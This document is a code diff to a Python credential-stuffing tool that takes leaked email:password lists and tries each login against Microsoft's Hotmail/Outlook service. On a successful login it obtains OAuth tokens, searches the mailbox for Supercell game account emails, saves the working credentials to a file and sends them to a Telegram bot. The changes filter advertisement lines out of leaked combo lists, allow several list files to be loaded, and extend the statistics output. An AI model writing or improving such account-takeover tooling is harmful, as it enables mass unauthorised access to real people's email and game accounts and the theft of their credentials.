@@ -92,17 +92,27 @@ class HotmailSupercellChecker:
   self.lock=threading.Lock()
   self.session=requests.Session()
   self.session.verify=False
+
  def load_combo(self,combo_file):
   if not os.path.exists(combo_file):
-   print(f"{Z}[Combo file not found]{M}")
-   return[]
+   print(f"{Z}[Combo file not found: {combo_file}]{M}")
+   return []
   combos=[]
-  with open(combo_file,'r',encoding='utf-8',errors='ignore')as f:
+  with open(combo_file,'r',encoding='utf-8',errors='ignore') as f:
    for line in f:
     line=line.strip()
-    if':'in line:
-     combos.append(line)
+    # Filter out banner/advertisement lines from combo files
+    if not line or line.startswith('¯') or line.startswith('|-') or \
+       line.startswith('Folder:') or line.startswith('All links:') or \
+       line.startswith('Free Hotmail:') or 'HOTMAIL VIP GROUP' in line or \
+       line.startswith('15$') or '$' in line[:10] and 'test' in line.lower():
+     continue
+    if ':' in line and '@' in line:
+     parts = line.split(':',1)
+     if len(parts) == 2 and '@' in parts[0]:
+      combos.append(line)
   return combos
+
  def send_telegram(self,username,password,links):
   try:
    lk=""
@@ -112,6 +122,7 @@ class HotmailSupercellChecker:
    TB.send_message(CI, ms)
   except Exception as e:
    print(f"{Z}[Telegram Error] {e}{M}")
+
  def check_account(self,username,password):
   try:
    login_url="https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={username}&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216"
@@ -122,32 +133,32 @@ class HotmailSupercellChecker:
    except:
     with self.lock:
      self.retries+=1
-    return"RETRY"
+    return "RETRY"
    response_text=response.text
-   if"Your account or password is incorrect."in response_text or"That Microsoft account doesn't exist."in response_text or"Sign in to your Microsoft account"in response_text:
+   if "Your account or password is incorrect." in response_text or "That Microsoft account doesn't exist." in response_text or "Sign in to your Microsoft account" in response_text:
     with self.lock:
      self.bad+=1
-    return"BAD"
-   if",AC:null,urlFedConvertRename"in response_text:
+    return "BAD"
+   if ",AC:null,urlFedConvertRename" in response_text:
     with self.lock:
      self.bad+=1
-    return"BAN"
-   if"account.live.com/recover?mkt"in response_text or"recover?mkt"in response_text or"account.live.com/identity/confirm?mkt"in response_text or"Email/Confirm?mkt"in response_text:
+    return "BAN"
+   if "account.live.com/recover?mkt" in response_text or "recover?mkt" in response_text or "account.live.com/identity/confirm?mkt" in response_text or "Email/Confirm?mkt" in response_text:
     with self.lock:
      self.twofactor+=1
     self.save_result(username,password,"2FA ENABLED","2FA")
-    return"2FA"
-   if"/cancel?mkt="in response_text or"/Abuse?mkt="in response_text:
+    return "2FA"
+   if "/cancel?mkt=" in response_text or "/Abuse?mkt=" in response_text:
     with self.lock:
      self.custom+=1
-    return"CUSTOM"
-   success_cookies='ANON'in str(response.cookies)or'WLSSC'in str(response.cookies)
-   success_address='https://login.live.com/oauth20_desktop.srf?'in response.headers.get('Location','')
+    return "CUSTOM"
+   success_cookies='ANON' in str(response.cookies) or 'WLSSC' in str(response.cookies)
+   success_address='https://login.live.com/oauth20_desktop.srf?' in response.headers.get('Location','')
    if success_cookies or success_address:
     cookies=response.cookies
     location=response.headers.get('Location','')
     refresh_token=None
-    if'refresh_token='in location:
+    if 'refresh_token=' in location:
      start=location.find('refresh_token=')+len('refresh_token=')
      end=location.find('&',start)
      if end==-1:
@@ -155,7 +166,7 @@ class HotmailSupercellChecker:
      refresh_token=location[start:end]
     if not refresh_token:
      try:
-      if'#'in location:
+      if '#' in location:
        fragment=location.split('#')[1]
        params=dict(x.split('=')for x in fragment.split('&')if'='in x)
        refresh_token=params.get('refresh_token')
@@ -164,7 +175,7 @@ class HotmailSupercellChecker:
     if not refresh_token:
      with self.lock:
       self.bad+=1
-     return"BAD"
+     return "BAD"
     token_url="https://login.live.com/oauth20_token.srf"
     token_payload={'grant_type':'refresh_token','client_id':'0000000048170EF2','scope':'https://substrate.office.com/User-Internal.ReadWrite','redirect_uri':'https://login.live.com/oauth20_desktop.srf','refresh_token':refresh_token,'uaid':'db28da170f2a4b85a26388d0a6cdbb6e'}
     token_headers={'x-ms-sso-Ignore-SSO':'1','User-Agent':'Outlook-Android/2.0','Content-Type':'application/x-www-form-urlencoded','Content-Length':'547','Host':'login.live.com','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
@@ -173,18 +184,18 @@ class HotmailSupercellChecker:
     except:
      with self.lock:
       self.retries+=1
-     return"RETRY"
+     return "RETRY"
     if token_response.status_code!=200:
      with self.lock:
       self.bad+=1
-     return"BAD"
+     return "BAD"
     try:
      token_data=token_response.json()
      access_token=token_data.get('access_token')
      if not access_token:
       with self.lock:
        self.bad+=1
-      return"BAD"
+      return "BAD"
      outlook_headers={'User-Agent':'Outlook-Android/2.0','Pragma':'no-cache','Accept':'application/json','ForceSync':'false','Authorization':f'Bearer {access_token}','X-AnchorMailbox':f'CID:{refresh_token}','Host':'substrate.office.com','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
      found_links=[]
      for email,service in SV.items():
@@ -195,12 +206,12 @@ class HotmailSupercellChecker:
        if search_response.status_code==200:
         search_data=search_response.json()
         total_msgs=0
-        if'EntityRequests'in search_data and len(search_data['EntityRequests'])>0:
+        if 'EntityRequests' in search_data and len(search_data['EntityRequests'])>0:
          entity_data=search_data['EntityRequests'][0]
-         if'Total'in entity_data:
+         if 'Total' in entity_data:
           total_msgs=int(entity_data['Total'])
         search_text=json.dumps(search_data)
-        if'"Total":'in search_text:
+        if '"Total":' in search_text:
          try:
           start=search_text.find('"Total":')+len('"Total":')
           end=search_text.find(',',start)
@@ -217,46 +228,53 @@ class HotmailSupercellChecker:
        self.hits+=1
       self.save_result(username,password,"HIT",None,"HIT")
       self.send_telegram(username,password,found_links)
-      return"HIT"
+      return "HIT"
      else:
       with self.lock:
        self.custom+=1
       self.save_result(username,password,"NOT LINKED",None,"FREE")
-      return"CUSTOM"
+      return "CUSTOM"
     except:
      with self.lock:
       self.bad+=1
-     return"BAD"
+     return "BAD"
    else:
     with self.lock:
      self.bad+=1
-    return"BAD"
+    return "BAD"
   except:
    with self.lock:
     self.retries+=1
-   return"RETRY"
+   return "RETRY"
+
  def save_result(self,username,password,info,proxy=None,hit_type="FREE"):
   if hit_type=="HIT":
-   with open("hits.txt","a",encoding="utf-8")as f:
+   with open("hits.txt","a",encoding="utf-8") as f:
     f.write(f"{username}:{password}\n")
+
  def print_stats(self,running=True):
   if running:
-   sys.stdout.write(f"\r     {S}{M}Hits:{F}{self.hits:,}{M} | 2FA:{C}{self.twofactor:,}{M} | Custom:{X}{self.custom:,}{M} | Bad:{Z}{self.bad:,}{M} | Retries:{A}{self.retries:,}{S}{M}")
+   sys.stdout.write(f"\r     {S}{M}Hits:{F}{self.hits:,}{M} | 2FA:{C}{self.twofactor:,}{M} | Custom:{X}{self.custom:,}{M} | Bad:{Z}{self.bad:,}{M} | Retries:{A}{self.retries:,}{S}{M} | Checked:{self.total:,}{M}")
    sys.stdout.flush()
   else:
-   print("\nFinished.")
+   print(f"\n\n{S}{M}━━━━━━━━━━━━━━━━━━━━ FINAL RESULTS ━━━━━━━━━━━━━━━━━━━━{M}")
+   print(f"{M}  Hits:{F}{self.hits:,}{M} | 2FA:{C}{self.twofactor:,}{M} | Custom:{X}{self.custom:,}{M} | Bad:{Z}{self.bad:,}{M} | Retries:{A}{self.retries:,}{M}")
+   print(f"{S}{M}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{M}")
+   print(f"{S}{M}Total Checked: {self.total:,}{M}")
+   print(f"{G}Finished.{M}")
+
  def run_checker(self,combo_file):
   combos=self.load_combo(combo_file)
   if not combos:
-   print(f"{Z}No combos{M}")
+   print(f"{Z}No valid combos found in {combo_file}{M}")
    return
-  self.total=len(combos)
+  self.total+=len(combos)
   start_time=time.time()
   batch_size=500
   completed=0
   for i in range(0,len(combos),batch_size):
    batch=combos[i:i+batch_size]
-   with ThreadPoolExecutor(max_workers=min(50,len(batch)))as executor:
+   with ThreadPoolExecutor(max_workers=min(50,len(batch))) as executor:
     futures=[]
     for combo in batch:
      try:
@@ -270,20 +288,46 @@ class HotmailSupercellChecker:
      if completed%10==0 or time.time()-start_time>5:
       self.print_stats()
       start_time=time.time()
-  self.print_stats(running=False)
+
 def main():
  checker=HotmailSupercellChecker()
- # Check for command line argument first
+
+ # Support multiple combo files from command line arguments
+ combo_files = []
  if len(sys.argv) > 1:
-  file = sys.argv[1]
+  combo_files = sys.argv[1:]
  else:
-  file=input(f"{X}Enter combo file:{M}").strip()
+  file = input(f"{X}Enter combo file(s) separated by space:{M}").strip()
+  combo_files = file.split()
+
  os.system('clear')
+
+ # Load and validate all files first
+ all_combos = []
+ for cf in combo_files:
+  combos = checker.load_combo(cf)
+  if combos:
+   print(f"{F}[+] Loaded {len(combos):,} valid combos from {cf}{M}")
+   all_combos.append((cf, combos))
+  else:
+   print(f"{Z}[-] No valid combos in {cf}{M}")
+
+ if not all_combos:
+  print(f"{Z}No valid combo files found!{M}")
+  return
+
+ total_all = sum(len(c) for _, c in all_combos)
+ print(f"{S}[*] Total combos to check: {total_all:,} from {len(all_combos)} file(s){M}\n")
+
  try:
-  checker.run_checker(file)
+  for combo_file, combos in all_combos:
+   checker.run_checker(combo_file)
+  checker.print_stats(running=False)
  except KeyboardInterrupt:
-  pass
+  checker.print_stats(running=False)
  except Exception as e:
-  pass 
+  print(f"\n{Z}[Error] {e}{M}")
+  checker.print_stats(running=False)
+
 if __name__=="__main__":
  main()
